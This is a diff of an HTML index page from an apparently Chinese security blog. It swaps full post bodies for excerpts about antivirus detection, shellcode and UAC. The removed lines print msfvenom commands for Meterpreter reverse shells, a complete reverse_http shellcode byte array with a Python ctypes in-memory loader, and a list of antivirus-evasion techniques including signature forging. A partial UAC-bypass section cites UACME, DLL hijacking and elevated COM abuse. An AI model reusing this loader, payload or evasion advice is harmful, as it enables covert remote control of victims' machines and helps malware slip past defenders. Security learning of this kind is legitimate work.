@@ -144,6 +144,74 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-shellcode的基础免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">shellcode的基础免杀</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" class="archive-article-date">
+  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="杀毒软件基本原理"><a href="#杀毒软件基本原理" class="headerlink" title="杀毒软件基本原理"></a>杀毒软件基本原理</h1><p>学习免杀，就要先学习杀毒软件的基本原理。知己知彼才能百战百胜。</p>
+<h2 id="杀毒软件的基本等级"><a href="#杀毒软件的基本等级" class="headerlink" title="杀毒软件的基本等级"></a>杀毒软件的基本等级</h2><h3 id="1-无毒"><a href="#1-无毒" class="headerlink" title="1.无毒"></a>1.无毒</h3><p>没有任何可疑行为，没有任何特征符合病毒。</p>
+<h3 id="2-可疑"><a href="#2-可疑" class="headerlink" title="2.可疑"></a>2.可疑</h3><p>存在可疑行为:操作注册表，打开powershell，修改用户名，操作敏感文件等。</p>
+<h3 id="3-确认病毒"><a href="#3-确认病毒" class="headerlink" title="3.确认病毒"></a>3.确认病毒</h3><p>特征符合病毒</p>
+        
+          <a class="article-more-a" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-shellcode基础与简单调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -152,105 +220,9 @@
         <p>title: shellcode基础与简单调用<br>date: 2022-03-17 18:39:49<br>tags:</p>
 <h1 id="shellcode基础"><a href="#shellcode基础" class="headerlink" title="shellcode基础"></a>shellcode基础</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段由16进制组成的机器码，因为经常可以让攻击者受到被害机器的shell而得名(但现在shellcode功能更多样，比如添加用户或者执行特殊命令，特殊进程等但是都被统称为shellcode)，其特点是在于它可以无文件落地，直接在内存中运行，以至于一般杀毒软件无法查杀到。一般来说，shellcode会在目标机器上建立一个新的shell进程，然后同攻击者进行通信，接受攻击者的指令，然后返回结果。那么如何建立一个shell进程呢？在Unix中使用execve命令可以建立，而在windows下需要调用内核API来建立。</p>
 <h2 id="shellcode的方向"><a href="#shellcode的方向" class="headerlink" title="shellcode的方向"></a>shellcode的方向</h2><p>shellcode一般分为正向和反向。在msf中，我们经常会发现一个payload有reverse的前缀（表示为反向）它们的原理如下:</p>
-<h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>正向的payload原理是在目标机器上打开一个端口启动服务，攻击机主动连接打开的端口获得shell。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317185948447.png" alt="image-20220317185948447"></p>
-<p>但是这种模式存在缺点，如果网络不存在外部进入的连接，那么shell就无法建立。并且管理员也有可能会发现可疑的shell进程。</p>
-<h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><p>反向shellcode就是为了解决网络不允许外部进入的连接而构成的。shellcode使受害机器主动来连接我们在公网上的ip，之后创建一个shell进程接受我们的命令。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317190224968.png" alt="image-20220317190224968"></p>
-<h2 id="stager与stageless"><a href="#stager与stageless" class="headerlink" title="stager与stageless"></a>stager与stageless</h2><p>在msf中我们也经常看到以下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/x64/meterpreter/reverse_tcp </span><br><span class="line">windows/x64/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<p>这两个看起来都是一样的，便是meterpreter形式(meterpreter个人认为是一种加强了的shell，它带着一些后渗透的功能，方便操作者执行)的以反向tcp连接到攻击机。它们的区别在于上面的是stager，下面的是stageless。</p>
-<p>stager其实是一段很简单的加载器，其目的是与攻击机建立一个隧道。 接下来攻击机想要执行另外的功能就会通过这条隧道把所需的shellcode(这里是用来执行命令的shellcode)发送到受害机，受害机载入内存执行，达到新的攻击效果。</p>
-<p>而stageless就是把上面所需的功能给集合到一起了。只需要接受来自攻击机的命令就好，不需要在传送另外的数据。这也是为什么stageless比stager体积更大。</p>
-<h2 id="加载器和源码"><a href="#加载器和源码" class="headerlink" title="加载器和源码"></a>加载器和源码</h2><p>我们在msf中通过命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
-
-<p>生成的shell.exe文件其实主要包含以下部分：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317192214751.png" alt="image-20220317192214751"></p>
-<p>exe中包含关键的shellcode（其只占一小部分），更多的是加载器，加载器的目的就是把shellcode压入内存，而压入内存就代表计算机执行命令，我们成功getshell。</p>
-<h1 id="shellcode基础调用"><a href="#shellcode基础调用" class="headerlink" title="shellcode基础调用"></a>shellcode基础调用</h1><p>因为我没有学过C语言，所以我只能使用python来调用shellcode。要使用python调用shellcode，这里需要用到以下知识：</p>
-<h2 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h2><p>ctypes是python的内置的一个模块，可以实现动态链接库的调用以及c语言结构的相关的编程。既然可以调用动态链接库，那么就代表我们可以调用动态链接库中的函数。我们需要关注的动态链接库主要有<code>kernel32.dll</code>,<code>user32,dll</code>,<code>ntdll.dll</code>，这三个动态链接库对于windows来讲都是重要的动态链接库文件。</p>
-<h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc</span><br><span class="line">RtlMoveMemory</span><br><span class="line">CreateThread</span><br><span class="line">WaitForSingleObject</span><br></pre></td></tr></table></figure>
-
-<p>1.<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></p>
-<p>虽然翻译的中文晦涩难懂，但是看得出来它是在申请内存地址。其参数如下：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317193606649.png" alt="image-20220317193606649"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  [in, optional] LPVOID lpAddress,  //要分配地址的起始地址。</span><br><span class="line">  [in]           SIZE_T dwSize,      //申请区域的大小，以字节为单位</span><br><span class="line">  [in]           DWORD  flAllocationType, //内存分配的类型</span><br><span class="line">  [in]           DWORD  flProtect      //内存保护常量，但是同时也兼具分类内存执行的权限。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>2.<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">RtlMoveMemory</a></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317194111625.png" alt="image-20220317194111625"></p>
-<p>它的任务就是转移内存内容。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VOID RtlMoveMemory(</span><br><span class="line">  _Out_       VOID UNALIGNED *Destination, //源头</span><br><span class="line">  _In_  const VOID UNALIGNED *Source,   //目标地址</span><br><span class="line">  _In_        SIZE_T         Length     //转移的大小</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>3.<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/creating-threads">CreateThread</a></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317194546526.png" alt="image-20220317194546526"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateThread(</span><br><span class="line">  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes, //安全属性，一般设置为0或者null</span><br><span class="line">  [in]            SIZE_T                  dwStackSize, //初始栈的大小</span><br><span class="line">  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, //线程函数地址</span><br><span class="line">  [in, optional]  __drv_aliasesMem LPVOID lpParameter, //线程函数</span><br><span class="line">  [in]            DWORD                   dwCreationFlags, //创建线程标志</span><br><span class="line">  [out, optional] LPDWORD                 lpThreadId //线程id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>4.WaitForSingleObject</p>
-<p>等待线程执行完成</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317195021397.png" alt="image-20220317195021397"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD WaitForSingleObject(</span><br><span class="line">  [in] HANDLE hHandle,  //句柄</span><br><span class="line">  [in] DWORD  dwMilliseconds   //等待标志</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h2 id="基础调用"><a href="#基础调用" class="headerlink" title="基础调用"></a>基础调用</h2><p>在msf中先生成shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.137.133 LPORT=4444 -f c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220317195734473.png" alt="image-20220317195734473"></p>
-<p>这一串就是我们的shellcode，我们需要做的就是把这一串代码压入内存。接着在开发工具中编辑以下代码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">#为什么前面要加b，因为在内存中，程序都是以二进制运行，我们需要转成byte类型。</span><br><span class="line">shellcode = b&quot;&quot;</span><br><span class="line">shellcode += b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span><br><span class="line">shellcode += b&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span><br><span class="line">shellcode += b&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="line">shellcode += b&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span><br><span class="line">shellcode += b&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b\x48\x18\x01\xd3\x50&quot;</span><br><span class="line">shellcode += b&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac&quot;</span><br><span class="line">shellcode += b&quot;\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="line">shellcode += b&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="line">shellcode += b&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="line">shellcode += b&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="line">shellcode += b&quot;\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26&quot;</span><br><span class="line">shellcode += b&quot;\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8\x78\x00\x00\x00&quot;</span><br><span class="line">shellcode += b&quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x4d\x61&quot;</span><br><span class="line">shellcode += b&quot;\x63\x69\x6e\x74\x6f\x73\x68\x3b\x20\x49\x6e\x74\x65\x6c\x20&quot;</span><br><span class="line">shellcode += b&quot;\x4d\x61\x63\x20\x4f\x53\x20\x58\x20\x31\x32\x5f\x32\x5f\x31&quot;</span><br><span class="line">shellcode += b&quot;\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35&quot;</span><br><span class="line">shellcode += b&quot;\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c&quot;</span><br><span class="line">shellcode += b&quot;\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f&quot;</span><br><span class="line">shellcode += b&quot;\x6d\x65\x2f\x39\x38\x2e\x30\x2e\x34\x37\x35\x38\x2e\x38\x31&quot;</span><br><span class="line">shellcode += b&quot;\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00&quot;</span><br><span class="line">shellcode += b&quot;\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68\x5c&quot;</span><br><span class="line">shellcode += b&quot;\x11\x00\x00\xe8\x3d\x01\x00\x00\x2f\x47\x57\x51\x77\x72\x51&quot;</span><br><span class="line">shellcode += b&quot;\x4e\x4f\x4b\x66\x47\x39\x4e\x72\x77\x33\x33\x77\x57\x63\x45&quot;</span><br><span class="line">shellcode += b&quot;\x77\x5f\x59\x65\x43\x5f\x78\x74\x63\x52\x57\x56\x76\x44\x41&quot;</span><br><span class="line">shellcode += b&quot;\x4a\x67\x33\x4e\x53\x45\x6c\x6c\x4c\x46\x47\x67\x54\x6f\x5f&quot;</span><br><span class="line">shellcode += b&quot;\x32\x71\x39\x33\x38\x78\x70\x70\x61\x6e\x59\x49\x47\x4e\x50&quot;</span><br><span class="line">shellcode += b&quot;\x34\x37\x72\x35\x2d\x75\x30\x7a\x31\x62\x2d\x6b\x43\x78\x72&quot;</span><br><span class="line">shellcode += b&quot;\x75\x6c\x73\x50\x5f\x32\x30\x31\x54\x39\x4a\x72\x38\x78\x61&quot;</span><br><span class="line">shellcode += b&quot;\x53\x62\x6d\x56\x66\x49\x78\x72\x6d\x6d\x6b\x48\x70\x34\x79&quot;</span><br><span class="line">shellcode += b&quot;\x30\x6b\x31\x43\x4a\x49\x4e\x47\x5a\x37\x44\x54\x58\x6a\x4b&quot;</span><br><span class="line">shellcode += b&quot;\x76\x70\x56\x72\x55\x42\x79\x6f\x33\x4e\x48\x76\x76\x4d\x77&quot;</span><br><span class="line">shellcode += b&quot;\x78\x4d\x61\x6a\x57\x44\x46\x4c\x42\x58\x62\x6d\x43\x47\x4e&quot;</span><br><span class="line">shellcode += b&quot;\x72\x51\x4d\x57\x35\x65\x4a\x35\x48\x78\x6f\x74\x44\x53\x50&quot;</span><br><span class="line">shellcode += b&quot;\x64\x67\x52\x6b\x6e\x31\x57\x36\x77\x6c\x75\x41\x4e\x4f\x56&quot;</span><br><span class="line">shellcode += b&quot;\x46\x55\x45\x62\x77\x65\x00\x50\x68\x57\x89\x9f\xc6\xff\xd5&quot;</span><br><span class="line">shellcode += b&quot;\x89\xc6\x53\x68\x00\x02\x68\x84\x53\x53\x53\x57\x53\x56\x68&quot;</span><br><span class="line">shellcode += b&quot;\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56&quot;</span><br><span class="line">shellcode += b&quot;\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88\x13\x00&quot;</span><br><span class="line">shellcode += b&quot;\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xe1\xe8\x4c\x00\x00&quot;</span><br><span class="line">shellcode += b&quot;\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68&quot;</span><br><span class="line">shellcode += b&quot;\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20&quot;</span><br><span class="line">shellcode += b&quot;\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcf&quot;</span><br><span class="line">shellcode += b&quot;\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x7f\xff\xff&quot;</span><br><span class="line">shellcode += b&quot;\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x33\x37\x2e\x31\x33&quot;</span><br><span class="line">shellcode += b&quot;\x33\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shellCodeLoad(shellcode):</span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64  # 指定virtualloc函数的返回值类型</span><br><span class="line">    # 定义virtualloc函数,为什么它的参数fiallocationtype要指定为0x3000，它是0x1000和0x2000给它加起来。即又申请了到物理内存，又申请到虚拟内存。</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),</span><br><span class="line">                                              ctypes.c_int(0x40))</span><br><span class="line">    # 把shell写入缓冲区</span><br><span class="line">    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">    # 调用rtlmovememort函数，把shellcode从缓冲区移动到申请的虚拟内存</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))</span><br><span class="line">    #制造线程，第三个参数即我们需要调用的线程函数地址</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr),</span><br><span class="line">                                                 ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">    </span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    shellCodeLoad(bytearray(shellcode))</span><br></pre></td></tr></table></figure>
-
-<p>试着运行一下发现程序会议某种奇奇怪怪的异常结束。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220318162307604.png" alt="image-20220318162307604"></p>
-<p>这里困扰了我很久，在网上找了半天也没遇到相近的问题，我还怀疑过是自己win11系统很特殊，于是还用过虚拟机的win10来，仍然不行。后面搞了很久，最后怀疑是shellcode问题，因为我们生成的shellcode并没有设定系统的位数，也许这会是一个突破口，遂尝试了一下。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.137.133 LPORT=4444 -f c</span><br></pre></td></tr></table></figure>
-
-<p>生成新的shellcode，接着同样的方法调用。</p>
-<p>调用成功。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220318163136336.png" alt="image-20220318163136336"></p>
-<p>虽然立刻很开心的被火绒杀掉了…</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220318163113322.png" alt="image-20220318163113322"></p>
-<h1 id="shellcode简单的隐藏"><a href="#shellcode简单的隐藏" class="headerlink" title="shellcode简单的隐藏"></a>shellcode简单的隐藏</h1><p>免杀的主要技术有以下几点：</p>
-<ol>
-<li>修改特征码</li>
-</ol>
-<p>免杀的最基本思想就是破坏特征，这个特征可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串。</p>
-<ol start="2">
-<li>花指令免杀</li>
-</ol>
-<p>花指令其实就是一段毫无意义的指令，也可以称为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。因为大多数反病毒软件都是靠特征码来判断文件是否存在病毒，为了提高精度，特征码都是在一定偏移量限制之内的，否则就会对反病毒软件产生影响。我们加花指令就是为了让杀毒软件检测特征码的偏移量位移一段位置。</p>
-<ol start="3">
-<li>加壳免杀</li>
-</ol>
-<p>加壳免杀也被称为软件加密（或者软件压缩），只是加密(或压缩)的方式与目的不一样。壳就是软件增加的保护，并不会破坏里面的结构，当运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。但是现在杀软也会识别壳的特征，只要识别了就会认为这是一个恶意软件。</p>
-<ol start="4">
-<li>内存免杀</li>
-</ol>
-<p>CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。</p>
-<ol start="5">
-<li>二次编译</li>
-</ol>
-<p>msf提供了多种格式payload和encoder，生成的shellcode也为二次加工提供了很大遍历。虽然有很多二次加工的编码都已经被杀软收录了，但是其中<code>shikata_ga_nai</code>编码器，它能让每次生成的攻击载荷文件不一样，编码和解码也不一样。目前很难实现单一encoder编码绕过杀软，但是对shellcode进行进一步修改编译成了msf免杀的主流。互联网上有许多借助各种语言来对shellcode进行二次编码从而达到免杀效果。</p>
-<ol start="6">
-<li>分离免杀</li>
-</ol>
-<p>采用分离法，就是把shellcode和加载器分离。网上各种加载器代码很多，各种语言实现也有很多。分离免杀基本可以满足免杀要求。</p>
-<ol start="7">
-<li>资源修改</li>
-</ol>
-<p>有些杀软会设置扫描白名单。</p>
-<ul>
-<li>加资源</li>
-</ul>
-<p>使用ResHacker对文件进行资源操作，找来多个正常的软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。</p>
-<ul>
-<li>替换资源</li>
-</ul>
-<p>使用ResHacker替换无用的资源</p>
-<ul>
-<li>加签名</li>
-</ul>
-<p>使用签名伪造工具，将正常软件的签名信息加入到自己的软件中。</p>
-
+        
+          <a class="article-more-a" href="/2022/03/17/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/#more">more >></a>
+        
       
 
       
@@ -314,92 +286,9 @@
       
         <h1 id="UAC工作原理"><a href="#UAC工作原理" class="headerlink" title="UAC工作原理"></a>UAC工作原理</h1><p>UAC是微软<code>Microsoft Windows vista</code>以后版本引入的一种安全机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序(有时也称为”恶意软件”)损坏系统的效果。</p>
 <p>通过UAC，应用程序和任务可始终在非管理员账户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并阻止无意中更改系统设置。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309212400330.png" alt="image-20220309212400330"></p>
-<p>在开启了UAC后，如果用户是标准用户，windows会给用户分配一个标准<code>Access Token</code>,如果用户以管理员权限登录，会生成两份访问令牌，一份是完整的管理员访问令牌(Full Access Token),一份是标准用户令牌。当我们需要其他特权的时候，会弹出窗口，询问你是否要允许以下程序对此计算机更改？如果你有完整的访问令牌（即，你以管理员的身份登录，或者你属于管理员组），则可以选择是，然后继续进行。但是，如果已为了分配了标准的用户访问令牌，则会提示你输入具有特权的管理员的凭据。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220309213508939.png" alt="image-20220309213508939"></p>
-<p>UAC需要授权的过程有以下：</p>
-<ol>
-<li>配置windows update</li>
-<li>增加或者删除用户账户</li>
-<li>改变用户的账户类型</li>
-<li>改变UAC设置</li>
-<li>安装ActiveX</li>
-<li>安装或移除程序</li>
-<li>设置家长控制</li>
-<li>将文件移动或者复制到Program Files或windows目录</li>
-<li>查看其他用户文件夹</li>
-</ol>
-<h2 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h2><p>rundll32.exe是windows系统中的一个程序，顾名思义，就是用来执行32位的DLL文件(DLL内部的具体函数)。</p>
-<p>系统各种还有一个Rundll.exe文件，他的意思是“执行16位的DLL文件”</p>
-<p>rundll32.exe的具体作用是以命令行的方式调用动态链接程序库中的规定形式的导出函数。导出函数必须是如下形式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void` `CALLBACK BypassUAC(``HWND` `hWnd, ``HINSTANCE` `hInstance, ``LPSTR`</span><br><span class="line">`lpszCmdLine, ``int` `iCmdShow);</span><br></pre></td></tr></table></figure>
-
-<p>rundll32.exe在命令行下的使用方法为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rundll32.exe DLLname,Functionname [Arguments]</span><br></pre></td></tr></table></figure>
-
-<p><code>DLLname</code>位需要执行的DLL文件名</p>
-<p><code>Functionname</code>为需要执行的DLL文件的规定形式导出函数</p>
-<p><code>[Arguments]</code>为引出函数的具体参数</p>
-<h2 id="UACME项目"><a href="#UACME项目" class="headerlink" title="UACME项目"></a>UACME项目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hfiref0x/UACME</span><br></pre></td></tr></table></figure>
-
-<p>利用方式主要可以分为两大类：</p>
-<ol>
-<li>各类UAC白名单程序的DLL劫持(DLL hijack)</li>
-<li>各类提升权限的COM接口利用（Elevated COM interface）</li>
-</ol>
